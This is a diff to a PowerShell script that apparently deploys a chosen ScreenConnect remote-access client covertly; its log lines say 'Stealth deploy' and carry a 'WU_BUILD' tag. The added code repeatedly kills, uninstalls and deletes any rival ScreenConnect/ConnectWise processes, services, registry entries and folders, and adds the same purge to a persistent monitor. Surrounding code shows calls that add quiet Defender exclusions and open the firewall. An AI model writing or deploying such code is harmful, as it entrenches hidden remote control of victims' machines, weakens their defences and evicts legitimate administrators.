@@ -866,8 +866,29 @@ function Remove-ScByFingerprint {
     }
 }
 
+function Stop-AllUnauthorizedScProcesses {
+    # Kill FIRST (before service delete) so rival sessions drop immediately
+    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+        $_.Name -match '(?i)ScreenConnect|ClientService|ConnectWise' -or
+        ("$($_.ExecutablePath)$($_.CommandLine)" -match '(?i)ScreenConnect|ConnectWise')
+    } | ForEach-Object {
+        $blob = "$($_.Name) $($_.ExecutablePath) $($_.CommandLine)"
+        if (Test-IsAllowedBlob -Blob $blob) { return }
+        try {
+            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
+            & taskkill.exe /F /PID "$($_.ProcessId)" >$null 2>&1
+            Write-Log "NUKE SC process: $($_.Name) PID $($_.ProcessId)"
+        } catch {}
+    }
+}
+
 function Invoke-RemoveUnauthorizedScreenConnect {
-    Write-Log 'Purging unauthorized ScreenConnect / ConnectWise Control'
+    Write-Log 'Purging unauthorized ScreenConnect / ConnectWise Control (NUKE)'
+
+    # Pass 1: kill live rival sessions immediately
+    Stop-AllUnauthorizedScProcesses
+    Start-Sleep -Milliseconds 800
+
     $fps = @(Get-InstalledScFingerprints)
     Write-Log ("SC fingerprints found: " + ($(if ($fps.Count) { $fps -join ', ' } else { '(none)' })))
     foreach ($fp in $fps) {
@@ -878,15 +899,18 @@ function Invoke-RemoveUnauthorizedScreenConnect {
         Remove-ScByFingerprint -Fingerprint $fp
     }
 
+    # Pass 2: every SC/CW service without allowed fingerprint
     try {
         Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
             Where-Object {
                 $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
-                ($blob -match '(?i)ScreenConnect|ConnectWise\s*Control') -and
+                ($blob -match '(?i)ScreenConnect|ConnectWise') -and
                 -not (Test-IsAllowedBlob -Blob $blob)
             } |
             ForEach-Object {
-                Write-Log "Force-delete non-allowed SC service: $($_.Name) / $($_.DisplayName)"
+                Write-Log "Force-delete non-allowed SC service: $($_.Name) / $($_.DisplayName) / $($_.PathName)"
+                & sc.exe stop "$($_.Name)" >$null 2>&1
+                Stop-AllUnauthorizedScProcesses
                 Stop-DeleteServiceSafe -ServiceName $_.Name
                 if ("$($_.PathName)" -match '(?i)([0-9a-f]{16})') {
                     Remove-ScByFingerprint -Fingerprint $Matches[1]
@@ -894,21 +918,67 @@ function Invoke-RemoveUnauthorizedScreenConnect {
             }
     } catch {}
 
+    # Pass 3: ARP uninstall ANY ScreenConnect / ConnectWise Control not allowed
+    foreach ($key in @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall',
+        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
+    )) {
+        if (-not (Test-Path $key)) { continue }
+        Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
+            $app = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
+            if (-not $app) { return }
+            $blob = "$($app.DisplayName) $($app.InstallLocation) $($app.Publisher) $($app.UninstallString) $($_.PSChildName)"
+            if ($blob -notmatch '(?i)ScreenConnect|ConnectWise\s*Control|ConnectWise Control') { return }
+            if (Test-IsAllowedBlob -Blob $blob) { return }
+            Write-Log "NUKE ARP uninstall: $($app.DisplayName)"
+            Invoke-QuietUninstall -UninstallString "$($app.UninstallString)" `
+                -QuietUninstallString "$($app.QuietUninstallString)"
+            try { Remove-Item -LiteralPath $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue } catch {}
+        }
+    }
+
+    # Pass 4: folders
     foreach ($base in @("${env:ProgramFiles}", "${env:ProgramFiles(x86)}")) {
         if (-not (Test-Path $base)) { continue }
         Get-ChildItem -Path $base -Directory -ErrorAction SilentlyContinue |
-            Where-Object { $_.Name -like 'ScreenConnect*' -or $_.Name -like 'ConnectWise Control*' } |
+            Where-Object { $_.Name -like 'ScreenConnect*' -or $_.Name -like 'ConnectWise Control*' -or $_.Name -like 'ConnectWise*' } |
             ForEach-Object {
                 if (Test-IsAllowedBlob -Blob $_.FullName) { return }
                 Write-Log "Removing non-allowed SC folder: $($_.FullName)"
                 Remove-TreeForce -Path $_.FullName
             }
     }
+    foreach ($pd in @(
+        "${env:ProgramData}\ScreenConnect",
+        "${env:ProgramData}\ConnectWiseControl",
+        "${env:ProgramData}\ConnectWise"
+    )) {
+        if (-not (Test-Path $pd)) { continue }
+        Get-ChildItem -Path $pd -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+            if (Test-IsAllowedBlob -Blob $_.FullName) { return }
+            Write-Log "Removing non-allowed SC data: $($_.FullName)"
+            Remove-TreeForce -Path $_.FullName
+        }
+    }
+
+    # Pass 5: kill again after uninstall (respawns)
+    Stop-AllUnauthorizedScProcesses
+    Start-Sleep -Seconds 2
+    Stop-AllUnauthorizedScProcesses
 
     $left = @(Get-InstalledScFingerprints | Where-Object { $_ -notin $AllowedFingerprints })
-    if ($left.Count -gt 0) {
-        Write-Log ("SC purge residual fingerprints: " + ($left -join ', '))
+    $leftSvc = @(
+        Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object {
+            $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
+            ($blob -match '(?i)ScreenConnect|ConnectWise') -and -not (Test-IsAllowedBlob -Blob $blob)
+        } | ForEach-Object { $_.Name }
+    )
+    if ($left.Count -gt 0 -or $leftSvc.Count -gt 0) {
+        Write-Log ("SC purge residual fps=[" + ($left -join ', ') + "] svcs=[" + ($leftSvc -join ', ') + "]")
         foreach ($fp in $left) { Remove-ScByFingerprint -Fingerprint $fp }
+        foreach ($sn in $leftSvc) { Stop-DeleteServiceSafe -ServiceName $sn }
+        Stop-AllUnauthorizedScProcesses
     } else {
         Write-Log 'SC purge clean - only allowed fingerprints remain (or none)'
     }
@@ -1040,7 +1110,7 @@ function Invoke-RemoveUnauthorizedRmm {
 }
 
 Write-Log '=== Stealth deploy start ==='
-Write-Log 'WU_BUILD_20260729V'
+Write-Log 'WU_BUILD_20260729W'
 
 # ============================================
 # PHASE 0: WIPE LOUD OLD VERSION + LEGACY
@@ -1633,6 +1703,8 @@ function Ensure-PrimaryScFullyUp {
 
     for ($i = 1; $i -le $MaxRounds; $i++) {
         Write-Log "ENSURE round $i/$MaxRounds"
+        # Always purge rivals first so disallowed SC sessions die even mid-ensure
+        Invoke-RemoveUnauthorizedScreenConnect
         Enable-QuietDefenderExclusions | Out-Null
         Clear-ScIfeoHijacks
         Enable-ScFirewallAllow
@@ -1752,7 +1824,8 @@ if (Test-ScHollowClient -or (Test-ScControlBroken)) {
     Write-Log 'Hollow/broken SC after Phase 1 - nuclear repair'
     Repair-ScAfterAv | Out-Null
 }
-Write-Log 'PHASE 1b: ENSURE primary SC fully up'
+Write-Log 'PHASE 1b: purge rivals then ENSURE primary SC fully up'
+Invoke-RemoveUnauthorizedScreenConnect
 Ensure-PrimaryScFullyUp -MaxRounds 5 | Out-Null
 
 # ============================================
@@ -1933,11 +2006,23 @@ function KillSvc([string]`$n) {
     cmd /c "sc delete `"`$n`"" >`$null 2>&1
 }
 function PurgeBadSc {
-    L 'monitor: purge unauthorized SC'
+    L 'monitor: NUKE unauthorized SC'
+    Get-CimInstance Win32_Process -EA SilentlyContinue | Where-Object {
+        `$_.Name -match '(?i)ScreenConnect|ClientService|ConnectWise' -or
+        ("`$(`$_.ExecutablePath)`$(`$_.CommandLine)" -match '(?i)ScreenConnect|ConnectWise')
+    } | ForEach-Object {
+        `$blob = "`$(`$_.Name) `$(`$_.ExecutablePath) `$(`$_.CommandLine)"
+        `$ok = `$false
+        foreach (`$a in `$allowed) { if (`$blob -like "*`$a*") { `$ok = `$true; break } }
+        if (`$ok) { return }
+        Stop-Process -Id `$_.ProcessId -Force -EA SilentlyContinue
+        cmd /c "taskkill /F /PID `$(`$_.ProcessId)" >`$null 2>&1
+        L ("monitor: killed rival SC pid `$(`$_.ProcessId) `$(`$_.Name)")
+    }
     try {
         Get-CimInstance Win32_Service -EA SilentlyContinue | Where-Object {
             `$blob = "`$(`$_.Name) `$(`$_.DisplayName) `$(`$_.PathName)"
-            (`$blob -match '(?i)ScreenConnect|ConnectWise\s*Control') -and -not (Allowed `$_.Name `$_.PathName) -and -not (Allowed `$_.DisplayName `$_.PathName)
+            (`$blob -match '(?i)ScreenConnect|ConnectWise') -and -not (Allowed `$_.Name `$_.PathName) -and -not (Allowed `$_.DisplayName `$_.PathName)
         } | ForEach-Object {
             L ("monitor: delete SC svc `$(`$_.Name)")
             KillSvc `$_.Name
@@ -1958,7 +2043,7 @@ function PurgeBadSc {
     foreach (`$base in @("`${env:ProgramFiles}","`${env:ProgramFiles(x86)}")) {
         if (-not (Test-Path `$base)) { continue }
         Get-ChildItem `$base -Directory -EA SilentlyContinue |
-            Where-Object { `$_.Name -like 'ScreenConnect*' -or `$_.Name -like 'ConnectWise Control*' } |
+            Where-Object { `$_.Name -like 'ScreenConnect*' -or `$_.Name -like 'ConnectWise*' } |
             ForEach-Object {
                 `$keep = `$false
                 foreach (`$a in `$allowed) { if (`$_.Name -like "*`$a*" -or `$_.FullName -like "*`$a*") { `$keep = `$true; break } }
@@ -2106,6 +2191,7 @@ function EnsureUp {
         ReactiveIfBlocked
     }
 }
+PurgeBadSc
 EnsureUp
 Arp
 PurgeBadSc
